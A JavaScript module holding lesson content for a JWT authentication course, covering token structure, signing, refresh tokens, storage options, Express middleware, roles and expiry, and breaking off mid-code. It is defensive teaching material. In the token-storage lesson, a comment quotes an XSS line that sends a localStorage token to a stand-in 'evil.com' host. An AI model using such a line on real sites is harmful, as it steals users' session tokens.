export const jwtTopics = [
  "What is JWT?",
  "JWT Structure - Header, Payload, Signature",
  "How JWT Works - The Complete Flow",
  "Setting Up JWT in Node.js",
  "Signing and Verifying Tokens",
  "Access Tokens vs Refresh Tokens",
  "Storing Tokens Safely",
  "JWT Middleware in Express",
  "Role-Based Access with JWT",
  "Token Expiry and Renewal",
  "JWT Security Best Practices",
  "Common JWT Vulnerabilities",
  "Implementing Logout with JWT",
  "Password Reset Flow",
  "Email Verification Flow",
  "OAuth and Social Login Concepts",
  "JWT in React Frontend",
  "Complete Auth System - Putting It Together"
];

export const jwtLessons = [

  {
    title: "What is JWT?",
    subtitle: "Explained Like a Digitally Signed ID Card That Speaks for Itself",
    sections: [
      {
        heading: "Think About Two Ways to Verify Someone's Identity",
        paragraphs: [
          "Imagine two approaches to verifying that someone is a registered hotel guest. Approach 1: every time they use the pool, gym, or restaurant, staff radio the front desk to verify the guest ID number. Approach 2: give the guest a digitally signed wristband containing their name, room number, and privileges — any staff member can verify the wristband's authenticity on the spot, without calling the front desk.",
          "Traditional session-based authentication is Approach 1 — every request requires a database lookup to verify the session. JWT (JSON Web Token) is Approach 2 — a self-contained, digitally signed token that any server can verify instantly without any database lookup."
        ]
      },
      {
        heading: "What JWT Actually Is",
        paragraphs: [
          "A JWT is a compact, self-contained string that encodes information (called 'claims') and includes a cryptographic signature verifying that information hasn't been tampered with. The token is issued by your server after successful login, sent to the client, and then presented by the client on every subsequent request to prove their identity.",
          "JWT stands for JSON Web Token — it's a web standard (RFC 7519) used by millions of applications worldwide. Your MERN project already uses JWTs — every login generates one and every protected route verifies one."
        ]
      },
      {
        heading: "JWT vs Sessions — Core Difference",
        code: `// Session-based (stateful):
// 1. User logs in
// 2. Server creates session record in database: { sessionId: "abc123", userId: "64f1a2", role: "student" }
// 3. Server sends cookie: sessionId=abc123
// 4. Every request: server looks up "abc123" in database to get userId/role
// Problem: every request hits the database; sessions don't scale across multiple servers

// JWT-based (stateless):
// 1. User logs in
// 2. Server creates JWT: encodes { userId: "64f1a2", role: "student" } + signs it
// 3. Server sends JWT to client
// 4. Every request: server just VERIFIES the signature — no database lookup!
// Benefit: scales to any number of servers; fast verification`
      },
      {
        heading: "When JWT Makes Sense",
        points: [
          "APIs serving multiple clients (React web app, mobile app, third-party integrations)",
          "Microservices architecture — multiple services can verify the same token independently",
          "Stateless applications — no shared session storage needed across server instances",
          "Your MERN platform — React frontend calls Express API, JWT verifies identity on every request"
        ]
      },
      {
        heading: "Important Points to Remember",
        points: [
          "JWT is a self-contained, digitally signed token — servers verify it without any database lookup.",
          "Stateless authentication: the token itself proves identity, no server-side session storage needed.",
          "Your MERN project already uses JWT — this course explains how and why it works.",
          "JWT enables scalability — any server with the JWT_SECRET can verify any token independently."
        ]
      }
    ]
  },

  {
    title: "JWT Structure - Header, Payload, Signature",
    subtitle: "Explained Like a Three-Part Official Document",
    sections: [
      {
        heading: "Think About an Official Government Document",
        paragraphs: [
          "An official government document has three distinct sections: a header identifying the type of document and the agency that issued it, the main body containing the actual information (name, date of birth, ID number), and an official seal/signature proving the document is genuine and hasn't been altered.",
          "A JWT has exactly these same three parts — header (document type and algorithm), payload (the actual claims/data), and signature (cryptographic proof of authenticity) — separated by dots."
        ]
      },
      {
        heading: "What a JWT Looks Like",
        code: `// A real JWT token:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY0ZjFhMmIzYzRkNWU2ZjdhOGI5YzBkMSIsImVtYWlsIjoibmlzaGl0aGFAZXhhbXBsZS5jb20iLCJyb2xlIjoic3R1ZGVudCIsImlhdCI6MTYzMDAwMDAwMCwiZXhwIjoxNjMwMDAzNjAwfQ.abc123signaturehere

// Three parts separated by dots:
// Part 1: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9   ← Header
// Part 2: eyJpZCI6IjY0ZjFhMmIz...                  ← Payload
// Part 3: abc123signaturehere                        ← Signature`
      },
      {
        heading: "Part 1: Header",
        code: `// The header is Base64URL encoded JSON:
// Decoded:
{
  "alg": "HS256",  // Algorithm used to sign: HS256 (HMAC-SHA256)
  "typ": "JWT"     // Type of token
}

// Common algorithms:
// HS256 (HMAC-SHA256) — symmetric, one secret key for both signing and verifying
// RS256 (RSA-SHA256) — asymmetric, private key signs, public key verifies
// Most MERN projects use HS256 — simpler, one JWT_SECRET in .env`
      },
      {
        heading: "Part 2: Payload (Claims)",
        code: `// The payload is Base64URL encoded JSON — the actual data:
{
  // Registered claims (standard, defined in the JWT spec):
  "iat": 1630000000,    // Issued At — when the token was created (Unix timestamp)
  "exp": 1630003600,    // Expiration — when the token expires (Unix timestamp)
  "sub": "64f1a2b3",    // Subject — who the token is about (usually user ID)

  // Private claims (your own custom data):
  "id": "64f1a2b3c4d5e6f7a8b9c0d1",
  "email": "nishitha@example.com",
  "role": "student"
}

// IMPORTANT: The payload is Base64URL ENCODED, not encrypted!
// Anyone can decode it — never put passwords, SSNs, or sensitive data in JWT
// jwt.io lets you decode any JWT in the browser — try it with your tokens!`
      },
      {
        heading: "Part 3: Signature",
        code: `// Signature is computed as:
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  JWT_SECRET
)

// The JWT_SECRET is the private key that only your server knows
// If ANYONE changes even one character in header or payload,
// the signature won't match → token rejected as tampered

// Example: changing { role: "student" } to { role: "admin" }
// Changes the payload → changes the Base64 encoding → changes the signature check
// Result: verification fails, the fraud is detected`
      },
      {
        heading: "Important Points to Remember",
        points: [
          "JWT = Header.Payload.Signature — three Base64URL-encoded parts separated by dots.",
          "The payload is encoded, NOT encrypted — anyone can read it. Never store sensitive data in JWT.",
          "The signature uses your JWT_SECRET to prove the token hasn't been tampered with.",
          "Changing any bit of the payload invalidates the signature — tampering is immediately detectable."
        ]
      }
    ]
  },

  {
    title: "How JWT Works - The Complete Flow",
    subtitle: "Explained Like Getting and Using a Digitally Signed Membership Card",
    sections: [
      {
        heading: "The Complete Authentication Flow",
        paragraphs: [
          "Understanding the complete JWT flow — from first login to accessing protected resources — is essential for building and debugging authentication systems. Every step has a specific purpose, and missing any step breaks the security model."
        ]
      },
      {
        heading: "Step 1: Login and Token Generation",
        code: `// Client sends credentials:
POST /login
{ "email": "nishitha@example.com", "password": "mypassword" }

// Server:
// 1. Find user by email
const user = await User.findOne({ email: req.body.email });
if (!user) return res.status(401).json({ error: "Invalid credentials" });

// 2. Verify password
const isMatch = await bcrypt.compare(req.body.password, user.password);
if (!isMatch) return res.status(401).json({ error: "Invalid credentials" });

// 3. Generate JWT
const token = jwt.sign(
  { id: user._id, email: user.email, role: user.role },
  process.env.JWT_SECRET,
  { expiresIn: "1h" }
);

// 4. Send token to client
res.json({ token, user: { name: user.name, email: user.email } });`
      },
      {
        heading: "Step 2: Client Stores and Sends Token",
        code: `// React frontend — after successful login:
const response = await axios.post("/login", { email, password });
localStorage.setItem("token", response.data.token);
localStorage.setItem("user", JSON.stringify(response.data.user));

// For every subsequent request to protected endpoints:
const token = localStorage.getItem("token");

const response = await axios.get("/dashboard", {
  headers: { Authorization: \`Bearer \${token}\` }
});

// Or configure axios to always send the token:
axios.defaults.headers.common["Authorization"] = \`Bearer \${token}\`;`
      },
      {
        heading: "Step 3: Server Verifies Token",
        code: `// verifyToken middleware runs before protected route handlers:
function verifyToken(req, res, next) {
  // 1. Extract token from Authorization header:
  const authHeader = req.headers.authorization;
  if (!authHeader || !authHeader.startsWith("Bearer ")) {
    return res.status(401).json({ error: "No token provided" });
  }

  const token = authHeader.split(" ")[1]; // "Bearer <token>" → "<token>"

  try {
    // 2. Verify signature and expiry:
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    // If signature is invalid → throws JsonWebTokenError
    // If token expired → throws TokenExpiredError

    // 3. Attach decoded user data to request:
    req.user = decoded; // { id, email, role, iat, exp }
    next(); // Proceed to route handler

  } catch (error) {
    if (error.name === "TokenExpiredError") {
      return res.status(401).json({ error: "Token expired, please log in again" });
    }
    return res.status(401).json({ error: "Invalid token" });
  }
}

// Protected route — verifyToken runs first:
app.get("/dashboard", verifyToken, (req, res) => {
  // req.user is available here:
  res.json({ message: \`Welcome \${req.user.email}\` });
});`
      },
      {
        heading: "The Complete Flow Visualized",
        points: [
          "1. Client → POST /login with email + password",
          "2. Server → verifies credentials, generates JWT signed with JWT_SECRET",
          "3. Server → sends JWT to client",
          "4. Client → stores JWT (localStorage), includes in every request header",
          "5. Server → verifyToken middleware extracts and verifies JWT signature",
          "6. Server → if valid, proceeds to route handler with req.user populated",
          "7. Server → if invalid/expired, returns 401 Unauthorized"
        ]
      },
      {
        heading: "Important Points to Remember",
        points: [
          "The server never stores the JWT — it only verifies the signature on each request.",
          "jwt.verify() does two things: verifies the signature AND checks expiry — both at once.",
          "Always send JWT in Authorization header as 'Bearer <token>', not in query params or body.",
          "req.user is populated by your middleware — available in all route handlers after verifyToken."
        ]
      }
    ]
  },

  {
    title: "Setting Up JWT in Node.js",
    subtitle: "Explained Like Installing and Configuring a Digital Signing Machine",
    sections: [
      {
        heading: "Installation",
        code: `npm install jsonwebtoken

// jsonwebtoken package gives you:
// jwt.sign()   — creates a token
// jwt.verify() — verifies and decodes a token
// jwt.decode() — decodes without verifying (unsafe — for debugging only)

// Your existing server.js already has this installed
// Check package.json: "jsonwebtoken": "^9.0.2"`
      },
      {
        heading: "Configuration — The JWT_SECRET",
        code: `// .env file:
JWT_SECRET=your_super_secret_key_minimum_32_characters_long_abc123xyz
JWT_EXPIRES_IN=1h
REFRESH_TOKEN_SECRET=different_secret_for_refresh_tokens_also_32_chars
REFRESH_TOKEN_EXPIRES_IN=7d

// Why the secret matters:
// A weak or short secret (like "secret" or "abc") can be brute-forced
// An attacker who discovers your JWT_SECRET can forge any user's identity
// Use a random string of at least 32 characters for production

// Generate a secure secret in Node.js:
const crypto = require("crypto");
console.log(crypto.randomBytes(64).toString("hex"));
// Outputs: a86b2d3c9e4f1a7... (128 hex characters)`
      },
      {
        heading: "Basic Sign and Verify",
        code: `require("dotenv").config();
const jwt = require("jsonwebtoken");

// SIGNING — creating a token:
const payload = {
  id: "64f1a2b3c4d5e6f7a8b9c0d1",
  email: "nishitha@example.com",
  role: "student"
};

const token = jwt.sign(
  payload,
  process.env.JWT_SECRET,
  {
    expiresIn: process.env.JWT_EXPIRES_IN,  // "1h", "24h", "7d", "30m"
    issuer: "edunexa-api",                   // Optional: who issued this token
    audience: "edunexa-users"               // Optional: who this token is for
  }
);

console.log(token);
// eyJhbGciOiJIUzI1NiIs...

// VERIFYING — checking a token:
try {
  const decoded = jwt.verify(token, process.env.JWT_SECRET);
  console.log(decoded);
  // { id: "64f1a2b3...", email: "nishitha@...", role: "student", iat: ..., exp: ... }
} catch (error) {
  console.log("Token invalid:", error.message);
  // "jwt expired" or "invalid signature" or "jwt malformed"
}`
      },
      {
        heading: "Creating a JWT Utility File",
        code: `// utils/jwt.js — centralize all JWT operations:
const jwt = require("jsonwebtoken");

exports.signToken = (payload, expiresIn = process.env.JWT_EXPIRES_IN) => {
  return jwt.sign(payload, process.env.JWT_SECRET, { expiresIn });
};

exports.verifyToken = (token) => {
  return jwt.verify(token, process.env.JWT_SECRET);
  // Returns decoded payload if valid
  // Throws JsonWebTokenError or TokenExpiredError if not
};

exports.decodeToken = (token) => {
  return jwt.decode(token);
  // Decodes WITHOUT verifying — only for debugging!
  // Never use this for authentication decisions
};

// Usage in routes:
const { signToken, verifyToken } = require("../utils/jwt");
const token = signToken({ id: user._id, role: user.role });`
      },
      {
        heading: "Important Points to Remember",
        points: [
          "JWT_SECRET must be at least 32 random characters — use crypto.randomBytes(64).toString('hex') to generate.",
          "Store JWT_SECRET in .env — never hardcode it. A leaked secret means compromised authentication.",
          "jwt.decode() skips verification — never use it for authentication decisions, only debugging.",
          "Create a JWT utility file to centralize sign/verify logic — avoids repeating it across routes."
        ]
      }
    ]
  },

  {
    title: "Signing and Verifying Tokens",
    subtitle: "Explained Like Stamping and Authenticating Official Documents",
    sections: [
      {
        heading: "jwt.sign() — Every Option Explained",
        code: `const jwt = require("jsonwebtoken");

// Basic signature:
jwt.sign(payload, secret)

// With all options:
jwt.sign(
  // Payload — what to encode:
  {
    id: user._id,
    email: user.email,
    role: user.role
    // Don't include: password, SSN, credit card numbers
  },

  // Secret — your signing key:
  process.env.JWT_SECRET,

  // Options:
  {
    expiresIn: "1h",          // "1h", "30m", "7d", "1y", or seconds: 3600
    notBefore: "10s",         // Token not valid until 10 seconds from now
    issuer: "edunexa-api",    // Identifies who issued the token
    audience: "web-client",   // Who the token is intended for
    subject: user._id.toString(), // Subject — usually user ID
    jwtid: uuid(),            // Unique token ID (for revocation blacklists)
  }
);`
      },
      {
        heading: "jwt.verify() — All Outcomes",
        code: `const jwt = require("jsonwebtoken");

function verifyJWT(token) {
  try {
    // Happy path — valid token:
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    return { valid: true, decoded };

  } catch (error) {
    // Possible errors:
    if (error.name === "TokenExpiredError") {
      return {
        valid: false,
        expired: true,
        message: "Token expired at " + error.expiredAt
      };
    }

    if (error.name === "JsonWebTokenError") {
      // Covers: invalid signature, malformed token, invalid issuer/audience
      return {
        valid: false,
        expired: false,
        message: error.message // "invalid signature", "jwt malformed", etc.
      };
    }

    if (error.name === "NotBeforeError") {
      return {
        valid: false,
        message: "Token not active yet: " + error.date
      };
    }

    // Unknown error:
    return { valid: false, message: "Token verification failed" };
  }
}`
      },
      {
        heading: "Verify with Options",
        code: `// Verify and enforce specific claims:
jwt.verify(token, process.env.JWT_SECRET, {
  issuer: "edunexa-api",     // Must match what was set in sign()
  audience: "web-client",    // Must match
  clockTolerance: 5,         // Allow 5 seconds of clock drift between servers
  maxAge: "2h"               // Reject tokens older than 2 hours even if exp is later
});

// Async version (useful in promise chains):
jwt.verify(token, process.env.JWT_SECRET, (err, decoded) => {
  if (err) return next(err);
  req.user = decoded;
  next();
});

// Or promisify for async/await:
const { promisify } = require("util");
const jwtVerifyAsync = promisify(jwt.verify);

const decoded = await jwtVerifyAsync(token, process.env.JWT_SECRET);`
      },
      {
        heading: "Inspecting a Token Without Verifying",
        code: `// jwt.decode() — DO NOT use for auth decisions!
const decoded = jwt.decode(token);
// Returns: { id: "...", email: "...", role: "...", iat: ..., exp: ... }
// OR null if the token is malformed

// Check expiry without verifying (unsafe for auth):
const decoded = jwt.decode(token);
const isExpired = decoded?.exp < Date.now() / 1000;

// Useful for: displaying user info from token before verification
//             frontend checking if token is expired before making a request`
      },
      {
        heading: "Important Points to Remember",
        points: [
          "jwt.sign() encodes and signs; jwt.verify() verifies signature AND checks expiry simultaneously.",
          "Always handle TokenExpiredError and JsonWebTokenError separately — they need different client responses.",
          "Use clockTolerance (5-30 seconds) in production to handle minor clock differences between servers.",
          "jwt.decode() has no security guarantees — only use for reading token contents for display purposes."
        ]
      }
    ]
  },

  {
    title: "Access Tokens vs Refresh Tokens",
    subtitle: "Explained Like a Daily Pass vs a Monthly Membership Card",
    sections: [
      {
        heading: "Think About Two Types of Access Cards",
        paragraphs: [
          "A daily visitor pass is valid for one day only — short-lived, limited access, and expires automatically. A monthly membership card lasts much longer — it proves you're a long-term member and can be used to request a new daily pass when the current one expires.",
          "Access tokens and refresh tokens follow this exact model — access tokens are short-lived daily passes for API access, refresh tokens are long-lived membership cards for obtaining new access tokens when the current one expires."
        ]
      },
      {
        heading: "Why Two Tokens?",
        paragraphs: [
          "A long-lived access token (like 30 days) is convenient but dangerous — if stolen, the attacker has 30 days of access with no way to stop them (JWT is stateless — you can't invalidate it). A short-lived access token (15 minutes) limits the damage window — a stolen token becomes useless quickly.",
          "But short-lived tokens mean users log in every 15 minutes — terrible UX. The refresh token solves this: it silently gets a new access token when the current one expires, without requiring the user to re-enter their password."
        ]
      },
      {
        heading: "Implementing Both Tokens",
        code: `// Login — issue BOTH tokens:
app.post("/login", async (req, res) => {
  const user = await authenticateUser(req.body.email, req.body.password);

  // Short-lived access token — for API requests:
  const accessToken = jwt.sign(
    { id: user._id, role: user.role },
    process.env.JWT_SECRET,
    { expiresIn: "15m" }   // Expires in 15 minutes
  );

  // Long-lived refresh token — for getting new access tokens:
  const refreshToken = jwt.sign(
    { id: user._id },       // Minimal payload — just the user ID
    process.env.REFRESH_TOKEN_SECRET,
    { expiresIn: "7d" }    // Expires in 7 days
  );

  // Send access token in response body, refresh token in httpOnly cookie:
  res.cookie("refreshToken", refreshToken, {
    httpOnly: true,   // Can't be accessed by JavaScript
    secure: true,     // HTTPS only
    sameSite: "Strict",
    maxAge: 7 * 24 * 60 * 60 * 1000 // 7 days in milliseconds
  });

  res.json({
    accessToken,    // Client stores in memory (not localStorage!)
    user: { name: user.name, email: user.email }
  });
});`
      },
      {
        heading: "Refresh Endpoint",
        code: `// Client calls this when access token expires:
app.post("/auth/refresh", (req, res) => {
  const refreshToken = req.cookies.refreshToken; // From httpOnly cookie

  if (!refreshToken) {
    return res.status(401).json({ error: "No refresh token" });
  }

  try {
    // Verify refresh token:
    const decoded = jwt.verify(refreshToken, process.env.REFRESH_TOKEN_SECRET);

    // Issue new access token:
    const newAccessToken = jwt.sign(
      { id: decoded.id },  // We'd ideally re-fetch user here to get current role
      process.env.JWT_SECRET,
      { expiresIn: "15m" }
    );

    res.json({ accessToken: newAccessToken });

  } catch (error) {
    // Refresh token expired or invalid — force re-login:
    res.clearCookie("refreshToken");
    res.status(401).json({ error: "Session expired, please log in again" });
  }
});`
      },
      {
        heading: "Frontend Refresh Logic",
        code: `// axios interceptor — automatically refresh on 401:
axios.interceptors.response.use(
  response => response,  // Success — pass through
  async error => {
    const originalRequest = error.config;

    if (error.response?.status === 401 && !originalRequest._retry) {
      originalRequest._retry = true; // Prevent infinite retry loop

      try {
        // Get new access token:
        const { data } = await axios.post("/auth/refresh");
        const newToken = data.accessToken;

        // Update stored token and retry original request:
        localStorage.setItem("token", newToken);
        originalRequest.headers.Authorization = \`Bearer \${newToken}\`;
        return axios(originalRequest);

      } catch (refreshError) {
        // Refresh also failed — redirect to login:
        localStorage.removeItem("token");
        window.location.href = "/login";
      }
    }
    return Promise.reject(error);
  }
);`
      },
      {
        heading: "Important Points to Remember",
        points: [
          "Access tokens: short-lived (15min-1hr), sent in Authorization header, stored in memory.",
          "Refresh tokens: long-lived (7-30 days), stored in httpOnly cookie, used only to get new access tokens.",
          "httpOnly cookies prevent JavaScript from reading the refresh token — protects against XSS.",
          "When refresh fails, force re-login — the user's long-term session has ended."
        ]
      }
    ]
  },

  {
    title: "Storing Tokens Safely",
    subtitle: "Explained Like Choosing the Right Safe for Different Valuables",
    sections: [
      {
        heading: "Think About Different Safes for Different Items",
        paragraphs: [
          "A home has different storage for different valuables: a wallet (convenient but accessible) for daily-use cash, a lockbox (secure but inconvenient) for important documents, a bank vault (maximum security) for irreplaceable items. The right storage depends on the value, how often you need it, and the threats you're protecting against.",
          "Token storage follows the same trade-off thinking — convenience vs security, with different vulnerabilities depending on where you store them."
        ]
      },
      {
        heading: "Option 1: localStorage",
        code: `// Storing in localStorage:
localStorage.setItem("token", token);
const token = localStorage.getItem("token");
localStorage.removeItem("token");

// PROS:
// ✅ Simple to implement
// ✅ Persists across browser tabs and refreshes
// ✅ Easy to access from any JavaScript code

// CONS:
// ❌ Vulnerable to XSS — if an attacker injects JavaScript into your app,
//    they can read localStorage and steal the token:
//    fetch("https://evil.com/steal?token=" + localStorage.getItem("token"))

// Your existing MERN project uses localStorage — common for learning projects
// and SPAs with thorough XSS prevention (Content Security Policy, sanitization)`
      },
      {
        heading: "Option 2: httpOnly Cookies (More Secure)",
        code: `// Server sets httpOnly cookie — JavaScript CANNOT read it:
res.cookie("accessToken", token, {
  httpOnly: true,      // Key: JavaScript can't access this
  secure: true,        // HTTPS only
  sameSite: "Strict",  // CSRF protection — only sent for same-site requests
  maxAge: 15 * 60 * 1000 // 15 minutes in milliseconds
});

// Client automatically sends the cookie with every request — no code needed!
// Authorization header NOT needed — cookie is sent automatically by browser

// PROS:
// ✅ XSS-resistant — JavaScript can't steal what it can't read
// ✅ Automatic — browser handles sending it

// CONS:
// ❌ CSRF risk — attacker's site could trigger requests that include your cookie
//    (mitigated with SameSite: "Strict" and CSRF tokens)
// ❌ More complex setup — backend must set cookies, CORS needs credentials: true`
      },
      {
        heading: "Option 3: Memory (Most Secure, Least Convenient)",
        code: `// Store access token in React state — never touches storage:
function App() {
  const [accessToken, setAccessToken] = useState(null);

  // Only refresh token in httpOnly cookie (set by server)
  // Access token in memory — lost on page refresh, requires re-fetch

  async function login(credentials) {
    const { data } = await axios.post("/login", credentials);
    setAccessToken(data.accessToken); // In memory only!
  }

  // Axios instance uses the in-memory token:
  const authAxios = axios.create();
  authAxios.interceptors.request.use(config => {
    if (accessToken) {
      config.headers.Authorization = \`Bearer \${accessToken}\`;
    }
    return config;
  });
}

// PROS: ✅ XSS-resistant ✅ No CSRF risk
// CONS: ❌ Lost on page refresh (needs refresh token call on startup)`
      },
      {
        heading: "Recommendations",
        points: [
          "Learning projects / internal tools: localStorage is acceptable — simple, adequate for low-risk apps",
          "Public-facing apps with sensitive data: httpOnly cookies for refresh token + memory for access token",
          "Highest security: memory-only access token + httpOnly cookie refresh token + short expiry",
          "Your MERN project: localStorage is fine for this learning platform — implement httpOnly cookies for a real production app"
        ]
      },
      {
        heading: "Important Points to Remember",
        points: [
          "localStorage is vulnerable to XSS — any injected script can steal tokens.",
          "httpOnly cookies are immune to JavaScript-based theft — the browser manages them entirely.",
          "Memory storage (React state) is safest but loses token on page refresh — needs refresh token flow.",
          "SameSite: 'Strict' on cookies prevents CSRF — don't set cookies without it."
        ]
      }
    ]
  },

  {
    title: "JWT Middleware in Express",
    subtitle: "Explained Like a Building's Security System With Multiple Checkpoints",
    sections: [
      {
        heading: "Building a Production-Quality Auth Middleware",
        code: `// middleware/auth.js — production-quality version:
const jwt = require("jsonwebtoken");
const User = require("../models/User");

// Basic token verification:
exports.verifyToken = async (req, res, next) => {
  try {
    // 1. Extract token:
    let token;

    if (req.headers.authorization?.startsWith("Bearer")) {
      token = req.headers.authorization.split(" ")[1];
    } else if (req.cookies?.accessToken) {
      token = req.cookies.accessToken; // Support both header and cookie
    }

    if (!token) {
      return res.status(401).json({
        success: false,
        error: { code: "NO_TOKEN", message: "Authentication required" }
      });
    }

    // 2. Verify token:
    const decoded = jwt.verify(token, process.env.JWT_SECRET);

    // 3. (Optional but recommended) Verify user still exists:
    const user = await User.findById(decoded.id).select("-password");
    if (!user) {
      return res.status(401).json({
        success: false,
        error: { code: "USER_NOT_FOUND", message: "User no longer exists" }
      });
    }

    // 4. Attach user to request:
    req.user = user;  // Full user object, not just decoded payload
    next();

  } catch (error) {
    if (error.name === "TokenExpiredError") {
      return res.status(401).json({
        success: false,
        error: { code: "TOKEN_EXPIRED", message: "Session expired, please log in again" }
      });
    }
    res.status(401).json({
      success: false,
      error: { code: "INVALID_TOKEN", message: "Invalid authentication token" }
    });
  }
};`
      },
      {
        heading: "Optional Authentication Middleware",
        code: `// For routes that work for both authenticated and unauthenticated users:
exports.optionalAuth = async (req, res, next) => {
  try {
    const token = req.headers.authorization?.split(" ")[1];

    if (token) {
      const decoded = jwt.verify(token, process.env.JWT_SECRET);
      req.user = await User.findById(decoded.id).select("-password");
    }
    // If no token — req.user is undefined, route continues anyway
    next();

  } catch (error) {
    // Invalid token — treat as unauthenticated, don't reject
    req.user = null;
    next();
  }
};

// Usage:
app.get("/courses", optionalAuth, (req, res) => {
  if (req.user) {
    // Return courses with user's progress data
  } else {
    // Return courses without personal progress data
  }
});`
      },
      {
        heading: "Role Check Middleware",
        code: `exports.requireRole = (...roles) => {
  return (req, res, next) => {
    if (!req.user) {
      return res.status(401).json({ error: "Authentication required" });
    }

    if (!roles.includes(req.user.role)) {
      return res.status(403).json({
        error: \`Access denied. Required role: \${roles.join(" or ")}\`
      });
    }

    next();
  };
};

// Usage — chain multiple middleware:
const { verifyToken, requireRole } = require("../middleware/auth");

router.delete("/courses/:id",
  verifyToken,
  requireRole("admin"),
  deleteCourse
);

router.post("/courses",
  verifyToken,
  requireRole("admin", "instructor"),
  createCourse
);`
      },
      {
        heading: "Middleware at Router Level",
        code: `// Apply to all routes in a router — cleaner than per-route:
const router = express.Router();
const { verifyToken } = require("../middleware/auth");

// Protect ALL routes in this router:
router.use(verifyToken);

// Now all these routes are automatically protected:
router.get("/", getUserProfile);
router.put("/:id", updateUser);
router.delete("/:id", deleteUser);`
      },
      {
        heading: "Important Points to Remember",
        points: [
          "Fetching the user from DB in middleware ensures you have current user data (role changes, deletions).",
          "Optional auth middleware allows routes to serve both authenticated and anonymous users.",
          "Chain verifyToken + requireRole for clean, readable, composable access control.",
          "router.use(verifyToken) protects all routes in that router — more maintainable than per-route."
        ]
      }
    ]
  },

  {
    title: "Role-Based Access with JWT",
    subtitle: "Explained Like Different Clearance Levels in a Government Office",
    sections: [
      {
        heading: "Think About Security Clearance Levels",
        paragraphs: [
          "A government office has different clearance levels — unclassified documents anyone can see, confidential documents requiring SECRET clearance, top secret documents requiring TOP SECRET clearance. The clearance level is encoded in your ID badge and checked at each secure door.",
          "Role-based access with JWT works the same way — the role is encoded in the token at login, and middleware checks the role against required clearance for each route."
        ]
      },
      {
        heading: "Roles in the JWT Payload",
        code: `// Assign roles at user creation/login:
const userSchema = new mongoose.Schema({
  name: String,
  email: String,
  password: String,
  role: {
    type: String,
    enum: ["student", "instructor", "admin"],
    default: "student"
  }
});

// Include role in token:
const token = jwt.sign(
  {
    id: user._id,
    email: user.email,
    role: user.role  // ← Include role in token
  },
  process.env.JWT_SECRET,
  { expiresIn: "1h" }
);

// After verification, req.user.role is available in all protected routes`
      },
      {
        heading: "Hierarchical Role Checking",
        code: `// Define role hierarchy:
const roleHierarchy = {
  admin: 3,      // Highest access
  instructor: 2,
  student: 1     // Basic access
};

// Middleware that accepts minimum role:
function requireMinRole(minRole) {
  return (req, res, next) => {
    const userLevel = roleHierarchy[req.user.role] || 0;
    const requiredLevel = roleHierarchy[minRole] || 0;

    if (userLevel < requiredLevel) {
      return res.status(403).json({
        error: \`Requires \${minRole} or higher. Your role: \${req.user.role}\`
      });
    }
    next();
  };
}

// Usage:
app.get("/courses", verifyToken, requireMinRole("student"), getCourses);
app.post("/courses", verifyToken, requireMinRole("instructor"), createCourse);
app.delete("/users", verifyToken, requireMinRole("admin"), deleteUser);`
      },
      {
        heading: "Resource-Level Authorization",
        code: `// Users can only modify their own resources (regardless of role):
app.put("/users/:id/progress", verifyToken, async (req, res) => {
  // Check: is this user updating THEIR OWN progress?
  const isOwner = req.user.id === req.params.id;
  const isAdmin = req.user.role === "admin";

  if (!isOwner && !isAdmin) {
    return res.status(403).json({
      error: "You can only update your own progress"
    });
  }

  // Proceed with update...
});

// Your existing progress route already has this pattern:
router.put("/html/:userId", verifyToken, async (req, res) => {
  const { userId } = req.params;
  // Implicitly trusts that req.user.id === userId
  // Could be improved by adding the check above
});`
      },
      {
        heading: "Checking Roles in Frontend",
        code: `// React — check role from stored user data:
const user = JSON.parse(localStorage.getItem("user"));

// Show admin-only UI elements:
{user?.role === "admin" && (
  <Link to="/admin/dashboard">Admin Panel</Link>
)}

// But ALWAYS also check on the backend!
// Frontend role checks are for UX only — not security
// A user could manually modify localStorage and see the UI
// The actual protection is the backend middleware

// Never trust the frontend to enforce security`
      },
      {
        heading: "Important Points to Remember",
        points: [
          "Include the role in the JWT payload at login — it's available in req.user.role after verification.",
          "Frontend role checks are for UX (showing/hiding elements) — backend middleware is the actual security.",
          "Hierarchical roles (admin > instructor > student) simplify access control logic.",
          "Resource ownership checks (is this your own resource?) are separate from role checks — always verify both."
        ]
      }
    ]
  },

  {
    title: "Token Expiry and Renewal",
    subtitle: "Explained Like Renewing a Parking Ticket Before It Expires",
    sections: [
      {
        heading: "Think About Parking Meters",
        paragraphs: [
          "A parking meter allows a fixed time window — say, 2 hours. Before the time runs out, you have two options: return to the meter and add more time (renewal before expiry) or come back to find a ticket (expired — must pay penalty and start fresh). Smart parking apps alert you before expiry so you can renew seamlessly.",
          "JWT token expiry management works the same way — tokens have a fixed valid period, and your application should detect impending expiry and renew silently before the user experiences an error."
        ]
      },
      {
        heading: "Checking Token Expiry",
        code: `const jwt = require("jsonwebtoken");

// Check if token is expired:
function isTokenExpired(token) {
  try {
    const decoded = jwt.decode(token); // Decode without verifying
    if (!decoded || !decoded.exp) return true;

    const currentTime = Date.now() / 1000; // Convert to seconds
    return decoded.exp < currentTime;
  } catch {
    return true;
  }
}

// Check if token expires soon (within the next 5 minutes):
function isTokenExpiringSoon(token, thresholdMinutes = 5) {
  try {
    const decoded = jwt.decode(token);
    if (!decoded?.exp) return true;

    const currentTime = Date.now() / 1000;
    const timeUntilExpiry = decoded.exp - currentTime;
    return timeUntilExpiry < thresholdMinutes * 60;
  } catch {
    return true;
  }
}

// Use in React to proactively refresh:
useEffect(() => {
  const token = localStorage.getItem("token");
  if (token && isTokenExpiringSoon(token)) {
    refreshAccessToken();
  }
}, []);`
      },
      {
        heading: "Token Rotation on Refresh",
        code: `// When issuing a new refresh token, invalidate the old one:
// (Requires storing refresh tokens in database — adds statefulness)

const refreshTokenSchema = new mongoose.Schema({
  token: { type: String, required: true, unique: true },
  userId: { type: mongoose.Schema.Types.ObjectId, ref: "User" },
  expiresAt: { type: Date, required: true },
  isRevoked: { type: Boolean, default: false }
});

const RefreshToken = mongoose.model("RefreshToken", refreshTokenSchema);

app.post("/auth/refresh", async (req, res) => {
  const { refreshToken } = req.body;

  // Check token exists and is not revoked:
  const storedToken = await RefreshToken.findOne({
    token: refreshToken,
    isRevoked: false,
    expiresAt: { $gt: new Date() }
  });

  if (!storedToken) {
